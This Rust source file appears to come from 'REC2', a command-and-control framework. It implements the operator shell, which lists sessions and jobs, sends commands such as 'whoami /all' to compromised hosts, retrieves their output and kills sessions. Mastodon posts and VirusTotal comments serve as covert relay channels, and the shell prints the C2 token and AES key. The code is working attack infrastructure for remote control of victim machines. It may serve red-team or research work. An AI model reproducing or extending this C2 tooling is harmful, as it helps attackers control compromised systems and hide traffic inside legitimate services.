//! Shell implementation 
use log::{debug,trace,error};
use std::process;
use std::time::Duration;
use colored::*;

use rustyline::error::ReadlineError;
use rustyline::{Result,DefaultEditor};
use shellwords::split;

use clap::{Arg, ArgMatches, ArgAction, value_parser, Command};
use crate::args::{Options,Social};
use crate::c2::sessions::{Session,remove_all_jobs_for_all_sessions,kill_session};
use crate::c2::jobs::Job;
use crate::c2::{get_sessions, display_sessions, display_jobs, exec_command, get_output_command};
use crate::modules::{rec2mastodon,rec2virustotal};

/// Default timeout after which tasks are backgrounded
pub const EXEC_TIMEOUT: Duration = Duration::from_secs(60);
/// Program succeeded.
pub const EXIT_SUCCESS: i32 = 0;
/// Program failed.
pub const EXIT_FAILURE: i32 = 1;

/// Modes exec, list, getoutput
#[derive(Debug)]
pub enum Mode {
    Infos,
    Exec,
    ListSessions,
    SetSessions,
    ListJobs,
    GetOutput,
    Clear,
    Kill,
    Exit,
    Unknown,
}

/// Rustyline args
#[derive(Debug)]
pub struct Commands {
    pub mode: Mode,
    pub session_id: u32,
    pub job_id: u32,
    pub cmd: String,
}

// New empty command line for shell
impl Commands {
    pub fn new() -> Option<Commands> {
        Some(Commands {
            mode: Mode::Unknown,
            session_id: 00000,
            job_id: 00000,
            cmd: "no set".to_string(),
        })
    }
}

/// Represents an interactive shell.
#[allow(dead_code)]
pub struct Shell {
    /// Initiale arguments from shell (token; url; aes key;)
    sargs: Options,
}

impl Shell {
    /// Instantiates terminal with social network mode
    pub async fn new(common_args: Options) -> Self {
        Shell {
            sargs: common_args,
        }
    }

    /// Start shell
    pub async fn run(&self) {
        Self::read_line(&self.sargs)
            .await
            .ok();
    }

    /// Clap arguments in readlines shell
    fn cli() -> Command {
        Command::new("server")
            .about("Rusty External Command and Control, server")
            .subcommand_required(true)
            .arg_required_else_help(true)
            .allow_external_subcommands(true)
            .subcommand(Command::new("infos")
                    .about("Get server C2 informations (url, token, aes key and more)")
            )
            .subcommand(Command::new("sessions")
                    .about("List all sessions or select one session")
                    .arg(Arg::new("id")
                        .short('i')
                        .long("id")
                        .help("session ID to select")
                        .required(false)
                        .value_parser(value_parser!(u32))
                    )
                )
            .subcommand(Command::new("jobs")
                    .about("List all jobs")
            )
            .subcommand(Command::new("clear")
                    .about("Clear current topic")
            )
            .subcommand(Command::new("exit")
                    .about("Quit server")
            )
            .subcommand(
                Command::new("exec")
                    .about("Execute command on one session")
                    .arg(Arg::new("id")
                        .short('i')
                        .long("id")
                        .help("session ID where to run command\nexec -i 1 -c \"whoami /all\"")
                        .required(true)
                        .value_parser(value_parser!(u32))
                    )
                    .arg(Arg::new("command")
                        .short('c')
                        .long("command")
                        .help("Command to execute")
                        .required(true)
                        .action(ArgAction::Append)
                    )
            )
            .subcommand(
                Command::new("get")
                    .about("Get command output from one job")
                    .arg(Arg::new("id")
                        .short('i')
                        .long("id")
                        .help("Job ID link to command line")
                        .required(true)
                        .value_parser(value_parser!(u32))
                    )
            )
            .subcommand(
                Command::new("kill")
                    .about("Kill one session")
                    .arg(Arg::new("id")
                        .short('i')
                        .long("id")
                        .help("Session ID to kill")
                        .required(true)
                        .value_parser(value_parser!(u32))
                    )
            )
    }

    /// Parsing clap arguments
    pub fn from_args(
        args: &[String],
    ) -> clap::error::Result<Option<Commands>> {
        let matches = Self::cli().try_get_matches_from(args)?;
        Self::from_matches(&matches)
    }

    /// Commands in readline rustyline return Commands struct
    fn from_matches(matches: &ArgMatches) -> clap::error::Result<Option<Commands>> {
        let mut mode = Mode::Unknown;
        let mut session_id: u32 = 00000;
        let mut job_id: u32 = 00000;
        let mut cmd = "".to_string();

        match matches.subcommand() {
            Some(("exit", _sub_matches)) => {
                mode = Mode::Exit;
            }
            Some(("infos", _sub_matches)) => {
                mode = Mode::Infos;
            }
            Some(("sessions", sub_matches)) => {
                mode = Mode::ListSessions;
                if sub_matches.contains_id("id") {
                    session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
                    mode = Mode::SetSessions;
                }
            }
            Some(("jobs", _sub_matches)) => {
                mode = Mode::ListJobs;
            }
            Some(("exec", sub_matches)) => {
                mode = Mode::Exec;
                session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
                cmd = sub_matches.get_one::<String>("command").map(|s| s.to_owned()).unwrap();
            }
            Some(("get", sub_matches)) => {
                mode = Mode::GetOutput;
                job_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
            }
            Some(("clear", _sub_matches)) => {
                mode = Mode::Clear;
            }
            Some(("kill", sub_matches)) => {
                mode = Mode::Kill;
                session_id = sub_matches.get_one::<u32>("id").map(|s| s.to_owned()).unwrap();
            }
            _ => {},
        }
        
        Ok(Some(Commands {
            mode: mode,
            session_id: session_id,
            job_id: job_id,
            cmd: cmd.to_string(),
        }))
    }

    /// Build and run read_line
    async fn read_line(
        common_args: &Options
    ) -> Result<()> {

        let mut rl = DefaultEditor::new()?;

        // Prepare Hashmap with sessions and jobs here
        let mut sessions: Vec<Session> = Vec::new();
        let mut jobs: Vec<Job> = Vec::new();

        loop {
            let readline = rl.readline(Self::make_prompt(&common_args.social).as_str());
            match readline {
                Ok(line) => {
                    Self::handle_line(
                        line,
                        &mut rl,
                        &common_args,
                        &mut sessions,
                        &mut jobs,
                    )
                    .await
                    .ok();
                }
                Err(ReadlineError::Interrupted) => {
                    break;
                }
                _ => continue,
            }
        }
        Ok(())
    }

    // Function to make prompt 'SC2:X> '
    fn make_prompt(mode: &Social) -> String {
        match mode {
            Social::Mastodon => { 
                return format!("{}{}:{}> ","REC".truecolor(30,30,30).bold().on_bright_white(),"2".red().bold().on_bright_white(),"Mastodon".truecolor(89,90,255).bold())
            }
            // // Example
            Social::VirusTotal => { 
                return format!("{}{}:{}> ","REC".truecolor(30,30,30).bold().on_bright_white(),"2".red().bold().on_bright_white(),"VirusTotal".truecolor(11,77,218).bold())
            }
            _ => {
                error!("Error making prompt for Social::{:?}", mode);
                process::exit(EXIT_FAILURE)
            } 
        }
    }

    /// Handle an input line
    async fn handle_line(
        line: String,
        rl: &mut DefaultEditor,
        default_args: &Options,
        sessions: &mut Vec<Session>,
        jobs: &mut Vec<Job>,
    ) -> Result<()> {
        // Rustyline terminal
        let _ = rl.add_history_entry(line.as_str());
        #[warn(unused_must_use)]
        let result = rl.append_history("history.txt");
        match result {
            Ok(result) => {  trace!("Appending history ok: {:?}", result);  }
            Err(err) => { error!("Error appending history: {:?}", err);  }
        }

        // Prepare arguments, remove whitespace
        let mut args = match split(&line) {
            Ok(args) => { args }
            Err(err) => { error!("Can't parse command line: {err}"); vec!["".to_string()] }
        };
        args.insert(0, "server".into());

        // Parse options
        let commands = match Shell::from_args(&args) {
            Ok(commands) => commands,
            Err(err) => {
                println!("{}", err);
                return Ok(());
            }
        };

        // Match options mode and run action
        // commands == clap arguments in rustyline shell
        // default_args == clap arguments set in the default command line ./server x y 
        if let Some(commands) = commands {
            match &commands.mode {
                Mode::Exit => {
                    debug!("Calling function Exit..");
                    process::exit(EXIT_SUCCESS);
                },
                Mode::Infos => {
                    debug!("Calling function Infos..");
                    Self::get_infos(default_args);
                },
                Mode::ListSessions => {
                    debug!("Calling function List Sessions..");
                    get_sessions(default_args, sessions).await;
                    display_sessions(sessions);
                },
                Mode::SetSessions => {
                    debug!("Calling function Set Session..");
                    get_sessions(default_args, sessions).await;
                    //set_session(commands.session_id, sessions);
                    // TODO
                },
                Mode::ListJobs => {
                    debug!("Calling function List Jobs..");
                    display_jobs(jobs);
                },
                Mode::Exec => {
                    debug!("Calling function Exec..");
                    exec_command(
                        default_args,
                        commands.session_id,
                        &commands.cmd,
                        sessions,
                        jobs,
                    ).await;
                },
                Mode::GetOutput => {
                    debug!("Calling function GetOutput for job ID..");
                    get_output_command(
                        default_args,
                        commands.job_id,
                        jobs,
                    ).await;
                },
                Mode::Clear => {
                    debug!("Calling function Clear all jobs for this topic..");
                    remove_all_jobs_for_all_sessions(
                        default_args,
                    ).await;
                },
                Mode::Kill => {
                    debug!("Calling function Kill session..");
                    kill_session(
                        default_args,
                        commands.session_id,
                        sessions,
                    ).await;
                },
                Mode::Unknown => {
                    error!("Command not found...");
                }
            }
        }
        Ok(())
    }

    // Function to display all informations about Social Network selected
    fn get_infos(default_args: &Options) {
        match default_args.social {
            Social::Mastodon => {
                let (url, username, topic) = rec2mastodon::parse_mastodon_url(&default_args.url);
                println!("{:<4}{}","",format!("{:<10}: {:?}","SOCIAL".cyan().bold(),default_args.social));
                println!("{:<4}{}","",format!("{:<10}: {}","URL".cyan().bold(),&url));
                println!("{:<4}{}","",format!("{:<10}: {}","USERNAME".cyan().bold(),&username));
                println!("{:<4}{}","",format!("{:<10}: {}","TOPIC".cyan().bold(),&topic));
                println!("{:<4}{}","",format!("{:<10}: {}","TOKEN".cyan().bold(),default_args.token));
                println!("{:<4}{}","",format!("{:<10}: {}","AES KEY".cyan().bold(),default_args.key));
                println!("{:<4}{}","",format!("{:<10}: {:?}","LOG LEVEL".cyan().bold(),default_args.verbose));
            }
            Social::VirusTotal => {
                let (url, vtype, resource_id) = rec2virustotal::parse_virustotal_url(&default_args.url);
                println!("{:<4}{}","",format!("{:<10}: {:?}","SOCIAL".cyan().bold(),default_args.social));
                println!("{:<4}{}","",format!("{:<10}: {}","URL".cyan().bold(),&url));
                println!("{:<4}{}","",format!("{:<10}: {:?}","TYPE".cyan().bold(),vtype));
                println!("{:<4}{}","",format!("{:<10}: {}","ID".cyan().bold(),&resource_id));
                println!("{:<4}{}","",format!("{:<10}: {}","API KEY".cyan().bold(),default_args.token));
                println!("{:<4}{}","",format!("{:<10}: {}","AES KEY".cyan().bold(),default_args.key));
                println!("{:<4}{}","",format!("{:<10}: {:?}","LOG LEVEL".cyan().bold(),default_args.verbose));
            }
            Social::Unknown => {
                error!("Dont know this social network..")
            }
        }
    }
}